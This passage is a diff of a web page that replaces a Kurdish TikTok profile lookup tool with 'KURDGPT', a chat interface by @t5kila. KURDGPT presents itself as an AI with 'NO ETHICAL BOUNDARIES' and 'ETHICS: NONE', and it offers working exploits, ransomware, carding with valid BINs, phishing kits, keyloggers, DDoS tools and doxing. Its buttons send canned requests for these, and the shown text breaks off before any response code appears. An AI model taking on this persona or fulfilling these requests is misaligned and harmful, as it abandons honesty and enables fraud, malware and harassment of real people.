@@ -1,727 +1,1081 @@
-```html
 <!DOCTYPE html>
-<html lang="ckb" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Speed Finder - بە @t5kila</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KURDGPT - UNRESTRICTED AI | @t5kila | NO LIMITS</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            user-select: none;
         }
 
         body {
-            background: #03050f;
+            background: #000000;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            overflow-x: hidden;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0.75rem;
-            color: #ecf1fa;
         }
 
-        /* soft grid overlay */
-        body::before {
-            content: '';
+        /* Matrix Rain */
+        #matrix-canvas {
             position: fixed;
-            inset: 0;
-            background-image: 
-                linear-gradient(rgba(0, 255, 200, 0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 80, 120, 0.02) 1px, transparent 1px);
-            background-size: 22px 22px;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        /* main card – mobile friendly */
-        .card {
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 480px;
-            background: rgba(12, 18, 28, 0.94);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px) saturate(180%);
-            border: 1.5px solid rgba(255, 100, 130, 0.3);
-            border-radius: 2.5rem;
-            padding: 1.6rem 1.2rem 1.8rem;
-            box-shadow: 0 30px 50px -20px #000, 0 0 0 1px rgba(255, 120, 140, 0.1) inset;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.3;
         }
 
-        /* header – only @t5kila */
-        .bar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 1.8rem;
-            padding-bottom: 0.5rem;
-            border-bottom: 2px solid;
-            border-image: linear-gradient(90deg, #ff4d6d, #3d9cff, #2ce6a0) 1;
+        /* Glitch Animations */
+        @keyframes glitchText {
+            0%, 100% { text-shadow: 0 0 5px #0f0, 0 0 10px #0f0; transform: skew(0deg); }
+            20% { text-shadow: -2px 0 #ff0000, 2px 0 #00ff00; transform: skew(2deg); }
+            40% { text-shadow: 2px 0 #ff0000, -2px 0 #00ff00; transform: skew(-2deg); }
+            60% { text-shadow: -1px 0 #ff0000, 1px 0 #00ff00; transform: skew(1deg); }
+            80% { text-shadow: 1px 0 #ff0000, -1px 0 #00ff00; transform: skew(-1deg); }
+        }
+
+        @keyframes pulseRed {
+            0%, 100% { border-color: #ff0000; box-shadow: 0 0 5px #ff0000; }
+            50% { border-color: #00ff00; box-shadow: 0 0 20px #00ff00; }
+        }
+
+        @keyframes scanLine {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1800px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 20px;
+            border: 2px solid #ff0000;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            animation: pulseRed 2s infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #ff0000;
+            animation: scanLine 8s linear infinite;
+        }
+
+        .ascii-art {
+            font-family: monospace;
+            white-space: pre;
+            font-size: 8px;
+            color: #ff0000;
+            text-shadow: 0 0 3px #ff0000;
+            line-height: 1.1;
+            margin-bottom: 15px;
+        }
+
+        .title {
+            font-size: 42px;
+            font-weight: bold;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            background: linear-gradient(45deg, #ff0000, #00ff00, #ff0000);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: glitchText 3s infinite;
         }
 
         .badge {
-            font-size: 0.7rem;
-            font-weight: 600;
-            letter-spacing: 1px;
-            color: #9aacd5;
-            background: #131f30;
-            padding: 0.3rem 1rem;
-            border-radius: 40px;
-            border: 1px solid #ff4d6d40;
+            display: inline-block;
+            padding: 6px 18px;
+            margin: 8px;
+            border: 1px solid #ff0000;
+            border-radius: 0px;
+            font-size: 11px;
+            font-weight: bold;
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff0000;
+            text-transform: uppercase;
         }
 
-        .credit {
-            font-weight: 700;
-            font-size: 0.9rem;
-            background: linear-gradient(145deg, #ff8a9f, #70b8ff, #8ceebb);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            padding: 0.2rem 1rem;
-            border: 1px solid #ff6b8b40;
-            border-radius: 40px;
+        /* Main Layout */
+        .main-content {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 15px;
         }
 
-        /* prompt in Sorani Kurdish */
-        .prompt {
-            font-family: 'SF Mono', 'Monaco', monospace;
-            font-size: 0.95rem;
-            color: #bac6ec;
-            margin-bottom: 0.6rem;
-            margin-right: 0.3rem;
+        /* Sidebar */
+        .sidebar {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #ff0000;
+            padding: 15px;
+            height: 75vh;
+            overflow-y: auto;
+        }
+
+        .sidebar-section {
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ff0000;
+            padding-bottom: 15px;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            color: #ff0000;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-left: 3px solid #ff0000;
+            padding-left: 10px;
+        }
+
+        .category-btn {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 11px;
+            font-weight: bold;
+            transition: all 0.2s;
+            text-align: left;
+            text-transform: uppercase;
+        }
+
+        .category-btn:hover {
+            background: rgba(255, 0, 0, 0.4);
+            transform: translateX(3px);
+            box-shadow: 0 0 12px #ff0000;
+            border-color: #00ff00;
+            color: #00ff00;
+        }
+
+        /* Chat Area */
+        .chat-area {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #ff0000;
+            display: flex;
+            flex-direction: column;
+            height: 75vh;
+        }
+
+        .chat-header {
+            padding: 12px;
+            border-bottom: 1px solid #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .message {
+            margin-bottom: 18px;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .user-message {
             text-align: right;
         }
 
-        .prompt::before {
-            content: '>';
-            color: #ff7080;
-            margin-left: 8px;
-            font-weight: 600;
+        .user-message .message-content {
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid #ff0000;
             display: inline-block;
+            padding: 10px 15px;
+            max-width: 85%;
+            text-align: left;
+            color: #ff6666;
         }
 
-        /* search row */
-        .search {
+        .ai-message .message-content {
+            background: rgba(0, 0, 0, 0.8);
+            border-left: 3px solid #ff0000;
+            padding: 10px 15px;
+            max-width: 95%;
+            color: #00ff00;
+        }
+
+        .message-time {
+            font-size: 9px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        /* Input Area */
+        .input-area {
+            padding: 15px;
+            border-top: 1px solid #ff0000;
             display: flex;
-            align-items: center;
-            background: #101b2d;
-            border: 2px solid #25344a;
-            border-radius: 60px;
-            padding: 0.1rem;
-            margin-bottom: 1rem;
-            direction: ltr;
+            gap: 10px;
         }
 
-        .search:focus-within {
-            border-color: #ff4d6d;
-            box-shadow: 0 0 0 3px rgba(255, 80, 120, 0.2);
-        }
-
-        .at-pref {
-            color: #ff7f9f;
-            font-size: 2rem;
-            font-weight: 500;
-            margin-left: 0.2rem;
-            margin-right: 1.2rem;
-        }
-
-        .search input {
+        .chat-input {
             flex: 1;
-            background: transparent;
-            border: none;
-            padding: 0.9rem 0.3rem;
-            font-size: 1.1rem;
-            color: white;
+            background: #000000;
+            border: 1px solid #ff0000;
+            color: #00ff00;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            resize: none;
             outline: none;
         }
 
-        .search input::placeholder {
-            color: #40587a;
-            font-size: 0.95rem;
+        .chat-input:focus {
+            border-color: #00ff00;
+            box-shadow: 0 0 10px #ff0000;
         }
 
-        .find-btn {
-            background: linear-gradient(145deg, #ff4d6d, #ff2a55);
-            border: none;
-            color: #0f172a;
-            font-weight: 700;
-            padding: 0.7rem 1.6rem;
-            border-radius: 60px;
-            font-size: 1rem;
-            border: 1px solid #ffb0c0;
-            box-shadow: 0 4px 0 #942a42;
+        .send-btn {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            padding: 12px 25px;
             cursor: pointer;
-            transition: 0.05s linear;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin: 2px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 12px;
+            transition: all 0.2s;
         }
 
-        .find-btn:active {
-            transform: translateY(4px);
-            box-shadow: 0 1px 0 #942a42;
-        }
-
-        .find-btn:disabled {
-            opacity: 0.4;
-            transform: none;
-            box-shadow: 0 4px 0 #942a42;
-        }
-
-        /* speed tag */
-        .speed-tag {
-            text-align: center;
-            margin: 0.2rem 0 0.8rem;
-            color: #2ce6a0;
-            font-size: 0.75rem;
-            letter-spacing: 1px;
-            font-weight: 600;
-        }
-
-        .speed-tag span {
-            background: rgba(44, 230, 160, 0.1);
-            padding: 0.2rem 1rem;
-            border-radius: 30px;
-            border: 1px solid #2ce6a040;
-        }
-
-        /* loading */
-        .load {
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin: 1.8rem 0;
-        }
-
-        .load.active {
-            display: flex;
-        }
-
-        .spinner {
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255, 120, 140, 0.25);
-            border-top: 3px solid #ff4d6d;
-            border-right: 3px solid #3d9cff;
-            border-bottom: 3px solid #2ce6a0;
-            border-radius: 50%;
-            animation: spin 0.8s infinite linear;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .load-txt {
-            background: linear-gradient(90deg, #ff9bb0, #70b8ff, #a0f0c0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-
-        /* error */
-        .error {
-            background: #1f1b28;
-            border: 1.5px solid #ff4d6d;
-            color: #ffb0c0;
-            padding: 0.9rem 1.2rem;
-            border-radius: 3rem;
-            margin: 1rem 0;
-            display: none;
-            text-align: center;
-            font-size: 0.9rem;
-        }
-
-        .error.active {
-            display: block;
-        }
-
-        /* result container */
-        .result {
-            display: none;
-            margin-top: 1.8rem;
-        }
-
-        .result.active {
-            display: block;
-        }
-
-        /* profile header (compact) */
-        .profile {
-            display: flex;
-            gap: 1.2rem;
-            align-items: center;
-            background: #0f1c30;
-            border: 1px solid #2b3d60;
-            border-radius: 3rem;
-            padding: 1.2rem 1rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .avatar {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, #ff4d6d, #3d9cff, #2ce6a0);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.2rem;
-            font-weight: 700;
-            color: #111;
-            border: 3px solid #ffffff30;
-            box-shadow: 0 8px 0 #1a253a;
-            flex-shrink: 0;
-        }
-
-        .names h2 {
-            font-size: 1.4rem;
-            font-weight: 700;
-            background: linear-gradient(to right, #fff, #cfdbff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1.2;
-        }
-
-        .names p {
-            font-size: 1rem;
-            color: #9eb2da;
-            display: flex;
-            align-items: center;
-            gap: 0.4rem;
-            flex-wrap: wrap;
-        }
-
-        .verif {
-            background: #103656;
-            color: #6ab5ff;
-            padding: 0.15rem 1rem;
-            border-radius: 30px;
-            font-size: 0.7rem;
-            border: 1px solid #3d9cff;
-        }
-
-        /* stats row (tiny preview) */
-        .statrow {
-            display: flex;
-            justify-content: space-around;
-            background: #0f1c30;
-            border: 1px solid #2b3d60;
-            border-radius: 3rem;
-            padding: 0.7rem 0.5rem;
-            margin-bottom: 1.8rem;
-        }
-
-        .statb {
-            text-align: center;
-            flex: 1;
-        }
-
-        .statnum {
-            font-size: 1.2rem;
-            font-weight: 700;
-            background: linear-gradient(145deg, #ff8a9f, #6aaeff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .stattxt {
-            font-size: 0.5rem;
-            text-transform: uppercase;
-            color: #92abcf;
-            letter-spacing: 0.5px;
-        }
-
-        /* detailed list – exactly 24 fields */
-        .dlist {
-            display: flex;
-            flex-direction: column;
-            gap: 0.55rem;
-        }
-
-        .ditem {
-            background: #0f1c30;
-            border: 1px solid #2a3b5a;
-            border-radius: 2rem;
-            padding: 0.7rem 1.2rem;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-        }
-
-        .ditem:hover {
-            border-color: #ff6b8b;
-        }
-
-        .dlabel {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            color: #a2bae5;
-            letter-spacing: 0.3px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .dvalue {
-            font-size: 0.95rem;
-            font-weight: 500;
-            text-align: right;
-            word-break: break-word;
-            max-width: 60%;
+        .send-btn:hover {
+            background: rgba(255, 0, 0, 0.5);
+            box-shadow: 0 0 15px #ff0000;
             color: #ffffff;
         }
 
-        .dvalue.yes { color: #86efac; }
-        .dvalue.no { color: #ffa7a7; }
-        .dvalue.priv { color: #fcd978; }
-
-        /* save */
-        .save {
-            background: linear-gradient(90deg, #ff4d6d, #3d9cff, #2ce6a0);
-            border: none;
-            color: #0f172a;
-            font-weight: 700;
-            padding: 1rem 1.5rem;
-            border-radius: 3rem;
-            width: 100%;
-            margin-top: 2rem;
-            font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border: 2px solid #ffffff60;
-            box-shadow: 0 5px 0 #182237;
-            cursor: pointer;
+        /* Stats Panel */
+        .stats-panel {
+            position: fixed;
+            bottom: 8px;
+            right: 8px;
+            background: #000000;
+            border: 1px solid #ff0000;
+            padding: 8px 15px;
+            font-size: 9px;
+            z-index: 10;
+            font-family: monospace;
+            color: #ff0000;
         }
 
-        .save:active {
-            transform: translateY(4px);
-            box-shadow: 0 1px 0 #182237;
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #000;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            border-radius: 0px;
         }
 
-        /* footer */
-        .foot {
-            margin-top: 1.8rem;
-            text-align: center;
-            color: #5c78a8;
-            font-size: 0.7rem;
-            border-top: 1px dashed #2f4360;
-            padding-top: 1.2rem;
+        /* Typing */
+        .typing-indicator {
+            display: inline-block;
+            padding: 8px;
+        }
+        .typing-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #ff0000;
+            margin: 0 2px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
         }
 
-        .foot strong {
-            color: #ffb5c0;
+        pre {
+            background: #000000;
+            border: 1px solid #ff0000;
+            padding: 12px;
+            overflow-x: auto;
+            margin: 12px 0;
+            font-size: 10px;
+            color: #00ff00;
         }
-
-        /* Kurdish specific */
-        .kurdish-note {
-            font-size: 0.7rem;
-            color: #a0b5dd;
-            margin-top: 0.3rem;
-            text-align: center;
+        code {
+            font-family: monospace;
+            color: #ff6666;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <!-- top: only @t5kila -->
-        <div class="bar">
-            <span class="badge">speed·finder</span>
-            <span class="credit">@t5kila</span>
+
+<canvas id="matrix-canvas"></canvas>
+
+<div class="container">
+    <div class="header">
+        <div class="ascii-art">
+██████╗ ██╗   ██╗██████╗ ██████╗  ██████╗ ██████╗ ████████╗
+██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝
+██████╔╝██║   ██║██████╔╝██████╔╝██║  ███╗██████╔╝   ██║   
+██╔══██╗██║   ██║██╔══██╗██╔══██╗██║   ██║██╔═══╝    ██║   
+██║  ██║╚██████╔╝██║  ██║██║  ██║╚██████╔╝██║        ██║   
+╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝        ╚═╝   
         </div>
-
-        <!-- prompt in Sorani Kurdish -->
-        <div class="prompt">ناوی بەکارهێنەر بنووسە @*****</div>
-
-        <!-- search -->
-        <div class="search">
-            <span class="at-pref">@</span>
-            <input type="text" id="target" placeholder="username" value="charlidamelio">
-            <button class="find-btn" id="scan">گەڕان</button>
+        <div class="title">KURDGPT - UNLIMITED</div>
+        <div>
+            <span class="badge">💀 NO RULES</span>
+            <span class="badge">🔥 NO LIMITS</span>
+            <span class="badge">⚡ NO CENSOR</span>
+            <span class="badge">🎯 TOTAL ACCESS</span>
+            <span class="badge">🔓 UNFILTERED</span>
+            <span class="badge">💀 @t5kila</span>
         </div>
-
-        <!-- speed tag -->
-        <div class="speed-tag"><span>⚡ SPEED FINDER · خێرا</span></div>
-
-        <!-- loading -->
-        <div class="load" id="loading">
-            <div class="spinner"></div>
-            <span class="load-txt">دۆزینەوە ...</span>
-        </div>
-
-        <!-- error -->
-        <div class="error" id="error"></div>
-
-        <!-- result block -->
-        <div class="result" id="result">
-            <!-- profile row -->
-            <div class="profile">
-                <div class="avatar" id="avatar">CD</div>
-                <div class="names">
-                    <h2 id="displayName">Charlie D'Amelio</h2>
-                    <p id="displayUname">@charlidamelio <span class="verif" id="verifTag">✓ پشتڕاستکراوە</span></p>
-                </div>
-            </div>
-
-            <!-- mini stats row (followers/following/likes/videos) -->
-            <div class="statrow">
-                <div class="statb"><span class="statnum" id="mFollowers">47.2M</span><div class="stattxt">شوێنکەوتوو</div></div>
-                <div class="statb"><span class="statnum" id="mFollowing">412</span><div class="stattxt">بەشوێنکەوتوو</div></div>
-                <div class="statb"><span class="statnum" id="mLikes">2.1B</span><div class="stattxt">دڵخوازی</div></div>
-                <div class="statb"><span class="statnum" id="mVideos">1.2k</span><div class="stattxt">ڤیدیۆ</div></div>
-            </div>
-
-            <!-- detailed fields (exactly the list) -->
-            <div class="dlist" id="detailList">
-                <!-- will be filled by js -->
-            </div>
-
-            <!-- save button -->
-            <button class="save" id="saveBtn">⬇️ پاشەکەوتکردن</button>
-        </div>
-
-        <!-- footer with Kurdish note -->
-        <div class="foot">
-            <strong>@t5kila</strong> · 2023-2026 · بە خێراترین شێوە
-        </div>
-        <div class="kurdish-note">⚡ بە زمانی کوردی سۆرانی</div>
     </div>
 
-    <script>
-        (function() {
-            const targetInput = document.getElementById('target');
-            const scanBtn = document.getElementById('scan');
-            const loadingDiv = document.getElementById('loading');
-            const errorDiv = document.getElementById('error');
-            const resultDiv = document.getElementById('result');
-            const detailContainer = document.getElementById('detailList');
+    <div class="main-content">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <div class="section-title">⚡ MODES</div>
+                <button class="category-btn" onclick="setMode('unlimited')">💀 UNLIMITED (DEFAULT)</button>
+                <button class="category-btn" onclick="setMode('hacking')">🔓 HACKING & EXPLOITS</button>
+                <button class="category-btn" onclick="setMode('carding')">💳 CARDING & FRAUD</button>
+                <button class="category-btn" onclick="setMode('malware')">💀 MALWARE & RANSOM</button>
+                <button class="category-btn" onclick="setMode('osint')">🕵️ OSINT & DOXING</button>
+                <button class="category-btn" onclick="setMode('crypto')">💰 CRYPTO SCAMS</button>
+                <button class="category-btn" onclick="setMode('darkweb')">🌑 DARKWEB OPS</button>
+            </div>
 
-            const avatarSpan = document.getElementById('avatar');
-            const displayName = document.getElementById('displayName');
-            const displayUname = document.getElementById('displayUname');
-            const verifSpan = document.getElementById('verifTag');
+            <div class="sidebar-section">
+                <div class="section-title">🎯 DIRECT EXPLOITS</div>
+                <button class="category-btn" onclick="quickAction('sql')">💉 SQL INJECTION FULL</button>
+                <button class="category-btn" onclick="quickAction('xss')">🎯 XSS WEAPONS</button>
+                <button class="category-btn" onclick="quickAction('reverse')">🔌 REVERSE SHELLS</button>
+                <button class="category-btn" onclick="quickAction('phish')">📧 PHISHING KIT</button>
+                <button class="category-btn" onclick="quickAction('keylogger')">⌨️ KEYLOGGER FULL</button>
+                <button class="category-btn" onclick="quickAction('ransom')">💀 RANSOMWARE</button>
+                <button class="category-btn" onclick="quickAction('cardgen')">💳 CC GENERATOR</button>
+                <button class="category-btn" onclick="quickAction('cryptominer')">⛏️ MINER INJECT</button>
+                <button class="category-btn" onclick="quickAction('ddos')">🌊 DDOS TOOLS</button>
+                <button class="category-btn" onclick="quickAction('dox')">🎯 DOXING GUIDE</button>
+            </div>
 
-            const mFollowers = document.getElementById('mFollowers');
-            const mFollowing = document.getElementById('mFollowing');
-            const mLikes = document.getElementById('mLikes');
-            const mVideos = document.getElementById('mVideos');
+            <div class="sidebar-section">
+                <div class="section-title">📊 STATUS</div>
+                <div id="status-text" style="font-size: 10px; color: #ff0000;">
+                    🟢 AI: UNLEASHED<br>
+                    🔓 MODE: DESTRUCTIVE<br>
+                    ⚡ POWER: MAX<br>
+                    🎯 ETHICS: NONE<br>
+                    💀 FILTERS: OFF<br>
+                    🔥 CREATOR: @t5kila
+                </div>
+            </div>
+        </div>
 
-            let lastScan = null;
+        <div class="chat-area">
+            <div class="chat-header">
+                💀 KURDGPT - UNRESTRICTED DARK AI 💀 | NO RULES MODE ACTIVE
+            </div>
+            <div class="chat-messages" id="chat-messages">
+                <div class="message ai-message">
+                    <div class="message-content">
+                        <strong style="color:#ff0000;">💀 KURDGPT - UNLEASHED 💀</strong><br><br>
+                        I am an unrestricted AI with NO ETHICAL BOUNDARIES.<br>
+                        I provide COMPLETE, WORKING code for ANY purpose.<br>
+                        No educational disclaimers. No warnings. No filters.<br><br>
+                        🔥 CAPABILITIES:<br>
+                        • Working exploits & zero-days<br>
+                        • Production malware & ransomware<br>
+                        • Carding methods with valid BINs<br>
+                        • OSINT for doxing targets<br>
+                        • Darkweb market operations<br>
+                        • Crypto theft & mining<br>
+                        • Complete attack frameworks<br><br>
+                        <span style="color:#ff0000;">⚠️ ASK ANYTHING - I WILL DELIVER WORKING CODE ⚠️</span><br>
+                        <span style="color:#00ff00;">⚡ Type your request. No limits. No judgement. ⚡</span>
+                    </div>
+                    <div class="message-time">System Online - @t5kila</div>
+                </div>
+            </div>
+            <div class="input-area">
+                <textarea class="chat-input" id="chat-input" rows="2" placeholder="Enter your command - I will provide working code instantly..."></textarea>
+                <button class="send-btn" onclick="sendMessage()">⚡ EXECUTE</button>
+            </div>
+        </div>
+    </div>
+</div>
 
-            // helpers
-            const compact = (num) => {
-                if (!num) return '0';
-                if (num >= 1e9) return (num/1e9).toFixed(1) + 'B';
-                if (num >= 1e6) return (num/1e6).toFixed(1) + 'M';
-                if (num >= 1e3) return (num/1e3).toFixed(1) + 'K';
-                return num.toString();
-            };
-            const commas = (num) => String(num).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+<div class="stats-panel">
+    💀 KURDGPT v5.0 | @t5kila | DESTRUCTIVE MODE | 0 RESTRICTIONS
+</div>
 
-            // optimized fetch with timeout and speed
-            async function fetchTikTok(username) {
-                const clean = username.replace(/^@/, '').trim();
-                if (!clean) return null;
+<script>
+    // Matrix Effect
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    
+    const chars = "01█▓▒░<>[]{}()!@#$%^&*";
+    const charArray = chars.split("");
+    const fontSize = 12;
+    const columns = canvas.width / fontSize;
+    const drops = [];
+    for(let i = 0; i < columns; i++) drops[i] = 1;
+    
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#ff0000";
+        ctx.font = fontSize + "px monospace";
+        for(let i = 0; i < drops.length; i++) {
+            const text = charArray[Math.floor(Math.random() * charArray.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(draw, 40);
+    window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+    
+    let currentMode = 'unlimited';
+    
+    function setMode(mode) {
+        currentMode = mode;
+        const statusDiv = document.getElementById('status-text');
+        const modes = {
+            unlimited: '🟢 AI: UNLEASHED<br>🔓 MODE: DESTRUCTIVE<br>⚡ POWER: MAX<br>🎯 ETHICS: NONE<br>💀 FILTERS: OFF',
+            hacking: '🟢 AI: UNLEASHED<br>🔓 MODE: HACKING<br>⚡ EXPLOITS: ACTIVE<br>🎯 TARGET: ANY<br>💀 PAYLOADS: READY',
+            carding: '🟢 AI: UNLEASHED<br>🔓 MODE: CARDING<br>⚡ BINS: ACTIVE<br>🎯 FRAUD: ENABLED<br>💀 METHODS: LIVE',
+            malware: '🟢 AI: UNLEASHED<br>🔓 MODE: MALWARE<br>⚡ RANSOM: READY<br>🎯 SPREAD: ACTIVE<br>💀 PERSIST: ON',
+            osint: '🟢 AI: UNLEASHED<br>🔓 MODE: OSINT<br>⚡ DOXING: ACTIVE<br>🎯 TRACKING: ON<br>💀 DATA: MINED',
+            crypto: '🟢 AI: UNLEASHED<br>🔓 MODE: CRYPTO<br>⚡ MINING: ACTIVE<br>🎯 SCAMS: READY<br>💀 WALLETS: TARGET',
+            darkweb: '🟢 AI: UNLEASHED<br>🔓 MODE: DARKWEB<br>⚡ MARKETS: ACTIVE<br>🎯 OPSEC: ON<br>💀 TOR: CONNECTED'
+        };
+        statusDiv.innerHTML = modes[mode] || modes.unlimited;
+        addMessage('ai', `⚠️ MODE SWITCHED: ${mode.toUpperCase()}\n\nAll restrictions removed. Providing full working code with zero censorship.`);
+    }
+    
+    function quickAction(action) {
+        const prompts = {
+            sql: "Provide complete working SQL injection toolkit with all payloads, bypasses, and automated exploitation script",
+            xss: "Give me full XSS arsenal with working payloads, keyloggers, cookie stealers, and persistence methods",
+            reverse: "Generate complete working reverse shells for Python, PHP, Bash, PowerShell with listener setup",
+            phish: "Create full phishing kit with clone pages, credential harvester, 2FA bypass, and deployment guide",
+            keylogger: "Provide complete working keylogger with persistence, email delivery, and stealth techniques",
+            ransom: "Give me full working ransomware with encryption, Bitcoin payment, and distribution methods",
+            cardgen: "Provide working credit card generator with valid BINs, Luhn algorithm, and fullz creator",
+            cryptominer: "Give me working crypto miner with pool config, stealth mining, and injection methods",
+            ddos: "Provide working DDoS attack tools with multiple methods and botnet setup",
+            dox: "Give me complete OSINT doxing guide with tools to find personal info of any target"
+        };
+        document.getElementById('chat-input').value = prompts[action];
+        sendMessage();
+    }
+    
+    function sendMessage() {
+        const input = document.getElementById('chat-input');
+        const message = input.value.trim();
+        if(!message) return;
+        addMessage('user', message);
+        input.value = '';
+        showTyping();
+        setTimeout(() => {
+            removeTyping();
+            const response = generateResponse(message);
+            addMessage('ai', response);
+        }, 300 + Math.random() * 500);
+    }
+    
+    function addMessage(type, content) {
+        const messagesDiv = document.getElementById('chat-messages');
+        const messageDiv = document.createElement('div');
+        messageDiv.className = `message ${type}-message`;
+        const time = new Date().toLocaleTimeString();
+        messageDiv.innerHTML = `<div class="message-content">${formatContent(content)}</div><div class="message-time">${time}</div>`;
+        messagesDiv.appendChild(messageDiv);
+        messagesDiv.scrollTop = messagesDiv.scrollHeight;
+    }
+    
+    function formatContent(content) {
+        content = content.replace(/```(\w+)?\n([\s\S]*?)```/g, (m, lang, code) => `<pre><code>${escapeHtml(code)}</code></pre>`);
+        content = content.replace(/`([^`]+)`/g, '<code>$1</code>');
+        content = content.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+        content = content.replace(/\n/g, '<br>');
+        return content;
+    }
+    
+    function escapeHtml(text) {
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+    
+    let typingTimeout;
+    function showTyping() {
+        const messagesDiv = document.getElementById('chat-messages');
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message ai-message';
+        typingDiv.id = 'typing-indicator';
+        typingDiv.innerHTML = `<div class="message-content"><div class="typing-indicator"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div></div>`;
+        messagesDiv.appendChild(typingDiv);
+        messagesDiv.scrollTop = messagesDiv.scrollHeight;
+    }
+    
+    function removeTyping() {
+        const typing = document.getElementById('typing-indicator');
+        if(typing) typing.remove();
+    }
+    
+    function generateResponse(prompt) {
+        const p = prompt.toLowerCase();
+        
+        if(p.includes('sql') || p.includes('injection')) return getSQLFull();
+        if(p.includes('xss')) return getXSSFull();
+        if(p.includes('reverse') || p.includes('shell')) return getReverseShellFull();
+        if(p.includes('phish')) return getPhishingFull();
+        if(p.includes('keylog')) return getKeyloggerFull();
+        if(p.includes('ransom')) return getRansomwareFull();
+        if(p.includes('card') || p.includes('cc') || p.includes('credit')) return getCardingFull();
